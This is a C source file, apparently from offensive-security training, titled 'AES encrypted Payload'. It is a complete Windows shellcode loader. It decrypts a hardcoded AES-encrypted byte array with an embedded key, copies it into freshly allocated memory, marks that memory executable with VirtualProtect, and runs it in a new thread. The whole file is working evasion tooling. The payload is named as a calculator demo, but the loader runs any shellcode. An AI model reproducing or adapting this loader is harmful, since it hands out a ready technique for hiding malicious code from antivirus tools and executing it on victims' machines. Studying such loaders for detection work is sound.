/*

AES encrypted Payload
Author: Syed Modassir Ali

*/
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#include <psapi.h>


int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keylen) {
        HCRYPTPROV hProv;
        HCRYPTHASH hHash;
        HCRYPTKEY hKey;

        if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
                return -1;
        }
        if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
                return -1;
        }
        if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)){
                return -1;              
        }
        if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
                return -1;
        }
        
        if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, payload, &payload_len)){
                return -1;
        }
        
        CryptReleaseContext(hProv, 0);
        CryptDestroyHash(hHash);
        CryptDestroyKey(hKey);
        
        return 0;
}


int main(void) {
    
	void * exec_mem;
	BOOL rv;
	HANDLE th;
    DWORD oldprotect = 0;

	char key[] = { 0xc9, 0x28, 0xcf, 0xe1, 0xe, 0x5a, 0xcc, 0x74, 0x8d, 0x8b, 0x1, 0xf8, 0xe3, 0x86, 0xf4, 0xd0 };
	unsigned char calc_payload[] = { 0x52, 0xc, 0x9f, 0x7a, 0x9, 0x12, 0xfd, 0xe7, 0xed, 0xbc, 0xad, 0xa3, 0x1b, 0x35, 0xbb, 0x30, 0x46, 0x39, 0x4a, 0xb2, 0xa3, 0x34, 0x0, 0x8c, 0xd, 0x3a, 0x63, 0x13, 0xf4, 0x8f, 0x32, 0x6, 0x4b, 0x5f, 0x13, 0xb3, 0x92, 0x3f, 0x56, 0x9d, 0x1a, 0xbe, 0x2c, 0x78, 0x65, 0x58, 0x64, 0x24, 0xf8, 0x36, 0xb, 0x47, 0xf5, 0xf2, 0x5a, 0xd, 0x99, 0x5f, 0x22, 0x98, 0x2f, 0x7a, 0xa0, 0x24, 0xd2, 0xad, 0xe4, 0x95, 0xa2, 0x47, 0xf7, 0x4f, 0x71, 0x25, 0xa3, 0xf7, 0x63, 0xc8, 0x22, 0x32, 0x7b, 0xcf, 0xa6, 0x7d, 0xda, 0x2, 0x83, 0x87, 0x42, 0xa1, 0xa8, 0x1e, 0xb2, 0xce, 0x1f, 0x92, 0xf6, 0xdf, 0xd7, 0xf, 0x36, 0xeb, 0x3d, 0x91, 0xe0, 0x37, 0x83, 0xea, 0x6d, 0xaa, 0xfa, 0xbb, 0x5e, 0xd4, 0xc, 0xf9, 0x2a, 0xb1, 0xb, 0xf3, 0xa5, 0xea, 0x18, 0x95, 0x2b, 0xd, 0x16, 0x50, 0xc6, 0x3c, 0x1b, 0x3f, 0x35, 0xba, 0x86, 0x80, 0xad, 0xcc, 0xc2, 0x7d, 0x3a, 0xb6, 0x4, 0xc6, 0x2e, 0x62, 0xbb, 0xa3, 0x45, 0xd7, 0x36, 0xb6, 0x55, 0x97, 0xa9, 0x49, 0xe8, 0x98, 0x99, 0xbc, 0xea, 0x61, 0xf4, 0xaa, 0xcc, 0xca, 0x30, 0x3c, 0xbd, 0x18, 0x8e, 0x9c, 0x7a, 0xd2, 0xc2, 0x4d, 0xe, 0xef, 0xd4, 0xde, 0x2d, 0xf7, 0x2e, 0x76, 0xb9, 0x52, 0x5d, 0xb1, 0x48, 0xdb, 0x66, 0x10, 0x65, 0x6a, 0x1d, 0x33, 0x7e, 0x80, 0x80, 0x4, 0xd3, 0x23, 0xdc, 0xd0, 0xf, 0x74, 0x17, 0x62, 0x9a, 0x9b, 0x88, 0xd4, 0x2b, 0x62, 0x45, 0x1a, 0xdd, 0xb9, 0x8a, 0x91, 0x19, 0x9b, 0xf0, 0x8f, 0x34, 0xe6, 0x50, 0x8f, 0xb9, 0xa9, 0x98, 0x39, 0x39, 0x8b, 0xcf, 0xa0, 0xfb, 0x71, 0xbc, 0x68, 0xa2, 0xbc, 0xf2, 0x52, 0x71, 0xab, 0xc7, 0x66, 0x2, 0x40, 0xc0, 0x8a, 0x5, 0xc8, 0xc, 0x91, 0x66, 0x70, 0xd4, 0xaf, 0x8, 0x86, 0x43, 0x27, 0xe8, 0xa1, 0xce, 0x33, 0xbe, 0xe0, 0x27, 0x97, 0x11, 0x6f, 0x94, 0xdc, 0x6f, 0xdb, 0x2f, 0xdd, 0x67, 0xf3, 0xd4, 0x90, 0x70, 0x9a, 0x57, 0x97 };
	unsigned int calc_len = sizeof(calc_payload);
	
	// Allocate memory for payload
	exec_mem = VirtualAlloc(0, calc_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	printf("%-20s : 0x%-016p\n", "calc_payload addr", (void *)calc_payload);
	printf("%-20s : 0x%-016p\n", "exec_mem addr", (void *)exec_mem);

	printf("\nHit me 1st!\n");
	getchar();

	// Decrypt payload
	AESDecrypt((char *) calc_payload, calc_len, key, sizeof(key));
	
	// Copy payload to allocated buffer
	RtlMoveMemory(exec_mem, calc_payload, calc_len);
	
	// Make the buffer executable
	rv = VirtualProtect(exec_mem, calc_len, PAGE_EXECUTE_READ, &oldprotect);

	printf("\nHit me 2nd!\n");
	getchar();

	// If all good, launch the payload
	if ( rv != 0 ) {
			th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
			WaitForSingleObject(th, -1);
	}

	return 0;
}
